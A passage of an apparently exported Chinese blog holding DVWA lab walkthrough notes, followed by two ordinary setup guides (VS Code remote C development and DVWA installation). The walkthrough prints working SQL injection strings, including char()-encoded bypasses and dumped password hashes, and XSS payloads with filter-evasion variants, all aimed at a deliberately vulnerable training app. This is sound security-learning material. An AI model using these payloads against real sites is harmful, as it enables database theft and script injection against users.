Content-Type 没用，还是得造图片马比较坑的是，在 powershell 里的 copy 命令总是报错，在 cmd 里正常运行，离谱离谱</p><h1 id="insecure-captcha"><a class="markdownIt-Anchor" href="#insecure-captcha"></a> Insecure CAPTCHA</h1><p>验证码的 key 没有正确配置，我这儿没显示，不过可以学一下绕过方法感觉这个主要是代码审计，easy 难度第一步验证 CAPTCHA（step=1），第二步（step=2）再修改密码，可以抓包修改 step 的值绕过；medium 难度，构造参数 passed_captcha=true 绕过；hard 差不多也是构造参数</p><h1 id="sql-injection"><a class="markdownIt-Anchor" href="#sql-injection"></a> SQL Injection</h1><p><a href="https://baynk.blog.csdn.net/article/details/102793220">DVWA 之 SQL Injection</a>讲的挺好，就是赋值的时候的符号user(),database(),version()Surname: dvwa@localhost dvwa 8.0.29-0ubuntu0.20.04.31’ and 1=2 union select 1,group_concat(column_name) from information_schema.columns where table_schema=‘dvwa’ and table_name=‘users’ #Surname: guestbook,users</p><p>union select group_concat(user_id,first_name,last_name),group_concat(password)First name: 1adminadmin,2GordonBrown,3HackMe,4PabloPicasso,5BobSmithSurname: 5f4dcc3b5aa765d61d8327deb882cf99,e99a18c428cb38d5f260853678922e03,8d3533d75ae2c3966d7e0d4fcc69216b,0d107d09f5bbe40cade3de5c71e9e9b7,5f4dcc3b5aa765d61d8327deb882cf99然后是这个样子的 sql 注入<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FvjR1z74mcTuTx4kxTSMng_F5rAX.png" alt="" />抓包改数据，然后发现’和“符号转义了，所以不可以直接写库名和表名了，需要将库名和表名转别的形式：<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FquVLoKKNKLKgpm-CVog2IKVukww.png" alt="" />构造的注入语句：1 and 1=2 union select 1,group_concat(column_name) from information_schema.columns where table_schema=concat(char(100),char(118),char(119),char(97)) and table_name=concat(char(117),char(115),char(101),char(114),char(115)) #<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/Fps-ZS5TbL5Nu3DVL-5vcnZ5LqHt.png" alt="" />High 级别的只是在 SQL 查询语句中添加了 LIMIT 1，加#注释掉就行了（刚开始随便试了一下，没想到直接成了）</p><h1 id="sql-盲注"><a class="markdownIt-Anchor" href="#sql-盲注"></a> SQL 盲注</h1><p><a href="https://baynk.blog.csdn.net/article/details/102794083">SQL Injection(Blind)</a> 依旧写的很详细了，正常人用 sqlmap 吧</p><h1 id="weak-session-ids"><a class="markdownIt-Anchor" href="#weak-session-ids"></a> Weak Session IDs</h1><p>密码与证书等认证手段，一般仅仅用于登录（Login）的过程。当登陆完成后，用户访问网站的页面，不可能每次浏览器请求页面时都再使用密码认证一次。因此，当认证完成后。就需要替换一个对用户透明的凭证。这个凭证就是 SessionID。当用户登陆完成后，在服务器端就会创建一个新的会话（Session），会话中会保存用户的状态和相关信息。服务器端维护所有在线用户的 Session，此时的认证，只需要知道是哪个用户在浏览当前的页面即可。为了告诉服务器应该使用哪一个 Session，浏览器需要把当前用户持有的 SessionID 告知服务器。SessionID 一旦在生命周期内被窃取，就等同于账户失窃。同时由于 SessionID 是用户登录之后才持有的认证凭证，因此黑客不需要再攻击登陆过程（比如密码）。以前没见过这个漏洞，看了漏洞利用手段，感觉有点像密码学攻击的手段，SessionID 和密钥的定义差不多。看代码可以知道，easy 难度是 SessionID 从 0 开始累加、medium 难度将 SessionID 的值改成了当前的时间，hard 难度 MD5(i++,time)，缺少随机性。果然 impossible 难度用了随机数生成+sha1，随机性增强，破解难度大大提高。</p><h1 id="xss"><a class="markdownIt-Anchor" href="#xss"></a> XSS</h1><p>xss，看上去就是造个弹窗，看看定义：指攻击者在页面中注入恶意的脚本代码，当受害者访问该页面时，恶意代码会在其浏览器上执行。或许弹窗就是执行命令的方式？</p><h2 id="dom-型-xss"><a class="markdownIt-Anchor" href="#dom-型-xss"></a> DOM 型 XSS</h2><p>dom xss 的产生并没有和后台服务器产生交互，而是通过浏览器的 dom 树解析产生的。DOM（Document Object Model）即文档对象模型，一种处理 HTML 和 XML 文件的标准 API。以前一直没 get 到 dom 树是什么东西，自从自己写了个网页之后就顿悟，就是 HTML 的标签树。</p><p>easy 后端 php 没代码，纯纯靠 js 验证，看看网页代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;form name=<span class="string">&quot;XSS&quot;</span> method=<span class="string">&quot;GET&quot;</span>&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">&quot;default&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">if</span> (<span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;default=&quot;</span>) &gt;= <span class="number">0</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="keyword">var</span> lang = <span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>.<span class="title function_">substring</span>(<span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;default=&quot;</span>)+<span class="number">8</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;option value=&#x27;&quot;</span> + lang + <span class="string">&quot;&#x27;&gt;&quot;</span> + <span class="built_in">decodeURI</span>(lang) + <span class="string">&quot;&lt;/option&gt;&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;option value=&#x27;&#x27; disabled=&#x27;disabled&#x27;&gt;----&lt;/option&gt;&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;option value=&#x27;English&#x27;&gt;English&lt;/option&gt;&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;option value=&#x27;French&#x27;&gt;French&lt;/option&gt;&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;option value=&#x27;Spanish&#x27;&gt;Spanish&lt;/option&gt;&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;option value=&#x27;German&#x27;&gt;German&lt;/option&gt;&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Select&quot;</span> /&gt;</span></span></span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p>利用方法：在<code>/dvwa/vulnerabilities/xss_d/?default=English</code>中直接将 English 改为<code>&lt;script&gt;alert('xss')&lt;/script&gt;</code>，为什么修改参数会触发弹窗呢？大概是服务器把前端传过来的参数，过滤过滤在传回来吧</p><blockquote><p>根据恶意代码是否存储在服务器中，XSS 可以分为存储型的 XSS 与反射型的 XSS。DOM 型的 XSS 由于其特殊性，常常被分为第三种，这是一种基于 DOM 树的 XSS。例如服务器端经常使用 document.boby.innerHtml 等函数动态生成 html 页面，如果这些函数在引用某些变量时没有进行过滤或检查，就会产生 DOM 型的 XSS。DOM 型 XSS 可能是存储型，也有可能是反射型。</p></blockquote><p>原理差不多，过程不一样medium 后端有过滤：</p><ol><li>构造链接<code>/dvwa/vulnerabilities/xss_d/?#default=&lt;script&gt;alert('xss')&lt;/script&gt;</code>，#后面的东西不会发给服务器</li><li>用 img 标签或其他标签的特性去执行 js 代码，比如 img 标签的 onerror 事件，构造连接</li></ol><p>之前用过 img 的方法，这次使用 svg 的方法来完成。<code>/dvwa/vulnerabilities/xss_d/?default=&lt;/option&gt;&lt;/select&gt;&lt;svg onload=alert(&quot;xss&quot;)&gt;</code>svg 意为可缩放矢量图形，在加载的时候弹窗hard 难度要求 default 的值必须为 select 选择菜单中的值，用#来绕过注入代码</p><h2 id="反射性-xss"><a class="markdownIt-Anchor" href="#反射性-xss"></a> 反射性 xss</h2><p>绕过方法：</p><ol><li>双写绕过输入<code>&lt;sc&lt;script&gt;ript&gt;alert(/xss/)&lt;/script&gt;</code></li><li>大小写混淆绕过输入<code>&lt;ScRipt&gt;alert(/xss/)&lt;/script&gt;</code></li><li>通过 img、body 等标签的事件或者 iframe 等标签的 src 注入恶意的 js 代码。输入<code>&lt;img src=1 onerror=alert(/xss/)&gt;</code></li></ol><h2 id="存储型-xss"><a class="markdownIt-Anchor" href="#存储型-xss"></a> 存储型 XSS</h2><p>绕过方法一样，利用过程不同：存储型 xss 将用户构造的有害输入直接存储起来，不需要攻击者构造链接诱使受害人点击触发，而是目标网站的用户只要访问插入恶意代码的网站就能触发。多见于留言板</p><h1 id="content-security-policy-csp-bypass"><a class="markdownIt-Anchor" href="#content-security-policy-csp-bypass"></a> Content Security Policy (CSP) Bypass</h1><p>CSP 指的是内容安全检测，又称网页安全政策，CSP 的实质就是白名单制度，开发者明确告诉客户端，哪些外部资源可以加载和执行，等同于提供白名单。</p><p>首先可以 F12-&gt;网络-&gt;发送一个请求，可以看到请求头的限制，然后根据提供的地址尝试有没有包含成功，再者构造自己的地址看看能不能成功<a href="https://baynk.blog.csdn.net/article/details/103157671">CSP 攻略</a>中直接给服务器上传了一个 xss 代码文件（引入外部 js），我试了一下蚁剑，发现不太行，然后也是直接 xftp 传了一个过去</p><p>meduim 难度发现<code>unsafe-inline</code>参数，然后有<code>nonce</code>，作用在<a href="https://blog.csdn.net/weixin_30762087/article/details/96272416?spm=1001.2101.3001.6650.1&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-1-96272416-blog-88739948.pc_relevant_downloadblacklistv1&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-1-96272416-blog-88739948.pc_relevant_downloadblacklistv1&amp;utm_relevant_index=2">这里</a>有提到</p><ul><li>nonce-&lt;base64 值&gt;：</li></ul><p>特定使用一次性加密内联脚本的白名单。服务器必须在每一次传输政策时生成唯一的一次性值。否则将存在绕过资源政策的可能。但是这题 php 代码中把 nonce 写死，于是就可以利用这个 nonce 进行 XSS（内联 JavaScript 代码）hard 难度：请求网址:<code>http://121.37.194.38/dvwa/vulnerabilities/csp/source/jsonp.php?callback=solveSum</code>这个 callback 参数是不是调用一个函数，看<a href="https://baynk.blog.csdn.net/article/details/103157671">CSP 攻略</a>的意思大概是这个？抓包修改这个参数，弹窗成功</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">clickButton</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> s = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;script&quot;</span>);</span><br><span class="line">  s.<span class="property">src</span> = <span class="string">&quot;source/jsonp.php?callback=solveSum&quot;</span>;</span><br><span class="line">  <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大概意思是新建一个 script 标签（HTML 元素），指定这个标签 src 的属性，然后追加该标签按理说不至于啊，这都没有给他接受 callback 参数的机会，然后<a href="https://www.cnblogs.com/linfangnan/p/13714694.html">这里</a>提到 jsonp.php 获取 callback 参数后没有做任何过滤，拿源码一看，果然！</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: application/json; charset=UTF-8&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">array_key_exists</span> (<span class="string">&quot;callback&quot;</span>, <span class="variable">$_GET</span>)) &#123;</span><br><span class="line">  <span class="variable">$callback</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;callback&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$outp</span> = <span class="keyword">array</span> (<span class="string">&quot;answer&quot;</span> =&gt; <span class="string">&quot;15&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$callback</span> . <span class="string">&quot;(&quot;</span>.<span class="title function_ invoke__">json_encode</span>(<span class="variable">$outp</span>).<span class="string">&quot;)&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="javascript-attacks"><a class="markdownIt-Anchor" href="#javascript-attacks"></a> JavaScript Attacks</h1><p>easy 难度看源码，js 脚本直接在页面源码里，照<a href="https://baynk.blog.csdn.net/article/details/103168248">Js 攻略</a>这里改就行了，然后补充一点，浏览器执行 js 脚本直接 F12 控制台，输入函数名<code>generate_token()</code>即可。中等难度，js 不在前端，但可以得到 js 代码地址 ：<code>yourip/dvwa/vulnerabilities/javascript/source/medium.js</code>，直接访问可以看到生成 token 的函数叫<code>do_elsesomething(&quot;XX&quot;)</code>，改完 value 后控制台跑一遍即可。发现<a href="https://www.cnblogs.com/linfangnan/p/13739003.html">DVWA 通关指南：JavaScript Attacks (前端攻击)</a>这里讲的更好。根据上一步的方法查看 high.js 的内容，确实是一团乱码，根据<a href="http://deobfuscatejavascript.com/#">js 混淆还原工具 </a>可以得到 js 代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">do_something</span>(<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> t = <span class="string">&quot;&quot;</span>, n = e.<span class="property">length</span> - <span class="number">1</span>; n &gt;= <span class="number">0</span>; n--) t += e[n];</span><br><span class="line">  <span class="keyword">return</span> t;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">token_part_3</span>(<span class="params">t, y = <span class="string">&quot;ZZ&quot;</span></span>) &#123;</span><br><span class="line">  <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;token&quot;</span>).<span class="property">value</span> = <span class="title function_">sha256</span>(</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;token&quot;</span>).<span class="property">value</span> + y</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">token_part_2</span>(<span class="params">e = <span class="string">&quot;YY&quot;</span></span>) &#123;</span><br><span class="line">  <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;token&quot;</span>).<span class="property">value</span> = <span class="title function_">sha256</span>(</span><br><span class="line">    e + <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;token&quot;</span>).<span class="property">value</span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">token_part_1</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">  <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;token&quot;</span>).<span class="property">value</span> = <span class="title function_">do_something</span>(</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;phrase&quot;</span>).<span class="property">value</span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;phrase&quot;</span>).<span class="property">value</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="title function_">token_part_2</span>(<span class="string">&quot;XX&quot;</span>);</span><br><span class="line">&#125;, <span class="number">300</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;send&quot;</span>).<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>, token_part_3);</span><br><span class="line"><span class="title function_">token_part_1</span>(<span class="string">&quot;ABCD&quot;</span>, <span class="number">44</span>);</span><br></pre></td></tr></table></figure><p>这段代码的大致意思是 300ms 后执行 token_part_2，增加点击事件 token_part_3，执行 token_part_1实际上的执行顺序是 token_part_1，token_part_2，token_part_3，但因为 token_part_3 会在点击之后自动执行，所以只需要修改 value 后，依次执行<code>token_part_1(&quot;ABCD&quot;, 44)</code>和<code>token_part_2(&quot;XX&quot;)</code></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>VScode 配置远程开发C语言程序环境</title>
      <link href="/2021/09/28/VScode%20%E9%85%8D%E7%BD%AE%E8%BF%9C%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E7%8E%AF%E5%A2%83/"/>
      <url>/2021/09/28/VScode%20%E9%85%8D%E7%BD%AE%E8%BF%9C%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E7%8E%AF%E5%A2%83/</url>
      
        <content type="html"><![CDATA[<p>有些坑不记得了，如果哪里不完善，可以联系我（从笔记里搬到博客凑数</p><hr /> <span id="more"></span><ol><li>插件</li></ol><ul><li>C/C++</li><li>code Runner</li><li>Run in Terminal</li><li>Remote - SSH</li></ul><ol start="2"><li>配置 ssh 服务<ol><li>服务端配置 ssh 服务（以 centos8 为例，需要确保两台主机能互相 ping 通）</li></ol></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看openssh的安装情况，有输出则证明已安装</span></span><br><span class="line">yum list installed | grep openssh-server</span><br><span class="line"><span class="comment"># 启动sshd服务。</span></span><br><span class="line">service sshd start</span><br><span class="line"><span class="comment"># 检查sshd服务是否已经启动</span></span><br><span class="line">ps -e | grep sshd</span><br><span class="line"><span class="comment"># 将sshd服务添加之自启动列表中，并查看是否开启自启动sshd服务。</span></span><br><span class="line">systemctl <span class="built_in">enable</span> sshd.service</span><br><span class="line">systemctl list-unit-files | grep sshd</span><br><span class="line"><span class="comment"># 查看是否安装了GCC</span></span><br><span class="line">gcc --version</span><br><span class="line"><span class="comment"># 安装GCC</span></span><br><span class="line">yum -y install gcc gcc-c++ kernel-devel</span><br></pre></td></tr></table></figure><ol start="2"><li>vscode ssh 登录服务端</li></ol><p><img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/Fs8u020WwUJI51PBNuxVdqawAhaK.png" alt="" />安装完 Remote - SSH 会有这个图标，点击-&gt;Connect to Host-&gt;Configure SSH Hosts-&gt;选择一个 config</p><ul><li>配置 config 的信息：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Host VMware</span><br><span class="line">  HostName 192.168.79.128</span><br><span class="line">  User user</span><br></pre></td></tr></table></figure><p>Host：配置文件的名字HostName：远程主机的 IP 地址User：登录用户<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FgX8R0bKirDPYs_DESgdD3999ut6.png" alt="" /></p><ul><li>右击-&gt;Connect to Host</li></ul><p><img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FoevAyjgz110H78QrLhI4GqE7JRB.png" alt="" /></p><ul><li>选择对应的平台</li></ul><p><img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FvyArCi4SbZSZpDzbujKZtGy-wNj.png" alt="" /></p><ul><li>输入密码，按回车</li></ul><ol start="3"><li>配置 C 语言环境</li><li>从菜单栏选择 Terminal&gt;Configure Default Build Task, 在下拉栏里选择 C/C++: g++ build active file. 这会生成 tasks.json 文件</li><li>在菜单栏选择 Debug&gt;Add Configuration, 选择 C++ (GDB/LLDB), 在下拉栏中选择 g++ build and debug active file.这会创建 launch.json</li><li>在 setting.json 里添加<code>&quot;editor.formatOnType&quot;: true,</code>（c、d 两步是为了自动缩进和方便输入）</li><li>更改设置 文件-&gt;首选项-&gt;设置</li></ol><p>搜索 Run In Terminal ，勾选<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FlqJILF_LTs7aZKBUWTdKAocF9Rc.png" alt="" />搜索 format，勾选<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FpkNxu73etW8oqMhSeJh5iUW8OXT.png" alt="" /></p><ol start="4"><li>之后应该就能跑了，最近事务繁多，无暇再配置一遍看看有没有坑了，总之有坑联系我</li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>第0期 DVWA安装部署（Windows）</title>
      <link href="/2021/06/20/%E7%AC%AC0%E6%9C%9F%20DVWA%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2%EF%BC%88Windows%EF%BC%89/"/>
      <url>/2021/06/20/%E7%AC%AC0%E6%9C%9F%20DVWA%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2%EF%BC%88Windows%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>Damn Vulnerable Web Application（DVWA）是一个非常脆弱的 PHP/MySQL Web 应用程序。它的主要目标是帮助安全专业人员在合法环境中测试他们的技能和工具，帮助 web 开发人员更好地理解保护 web 应用程序的过程，并帮助学生和教师在受控教室环境中学习 web 应用程序安全。看 DVWA 首页似乎推荐部署在虚拟机里，有机会改一下</p> <span id="more"></span><h1 id="第一步-下载-phpstudy-并安装"><a class="markdownIt-Anchor" href="#第一步-下载-phpstudy-并安装"></a> 第一步 下载 phpstudy 并安装</h1><p><code>https://www.xp.cn/download.html</code>解压后进行安装，一般装在 D 盘问题不大。安装完成后，浏览器访问<code>127.0.0.1</code>，看到如下界面即安装成功。<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FnXzqpOWpbWzngKRymUsIQrAVe1P.png" alt="" /></p><h1 id="第二步-下载-dvwa-源码"><a class="markdownIt-Anchor" href="#第二步-下载-dvwa-源码"></a> 第二步 下载 DVWA 源码</h1><p><code>https://github.com/digininja/DVWA</code>或者使用命令：<code>git clone https://github.com/digininja/DVWA.git</code><img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FuH_W7zP0OSuFCifaaZJZ6NKDbmu.png" alt="" />打开 phpstudy 网站的根目录，在 phpstudy 的安装目录下，路径一般是<code>...\phpstudy_pro\WWW</code>。将解压后的 DVWA 文件夹复制到该目录。方便期间，DVWA-master 文件可以改名为 DVWA，以下以改名为前提进行演示。<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/Fp-2-PYcQuLviIV0FTZt0BiSy83P.png" alt="" />DVWA-&gt;config-&gt;config.inc.php.dist 文件，修改后缀名为 ini.php。<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FuqtscdXrTam_YH8izkIOQg9WlNa.png" alt="" /> **-&gt; **<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FrVZ0ILD0H1AVXkc8HPuCMQ6Ua-W.png" alt="" />打开该文件，修改数据库密码。首先查看 phpstudy 中的数据库密码，鼠标移到密码处就显示了。<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/Fv4FaGWFMoiZo84RcjA30akRRrVZ.png" alt="" />将 db_user 改为 root，db_password 根据 phpstudy 显示的改，我这里是 123456。<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FqDrERtj99DZcWaFEiVMEkl3K13j.png" alt="" /></p><h1 id="第三步-创建数据库"><a class="markdownIt-Anchor" href="#第三步-创建数据库"></a> 第三步 创建数据库</h1><p>浏览器访问<code>127.0.0.1/DVWA/setup.php</code>，找到最后，创建数据库。(这里如果失败，一般就是数据库名或者密码不对，看一下 phpstudy 的数据库设置就知道了)<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FiDJc3iAwimLMfDjaOaiSZK1pgv4.png" alt="" />  -&gt;  <img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FvJustiAjf3Zk68qrynim66ZJQzJ.png" alt="" />访问<code>http://127.0.0.1/DVWA/index.php</code> 进行登录，用户名/密码：admin/password。登陆成功后，DVWA 就可以正常使用了。</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
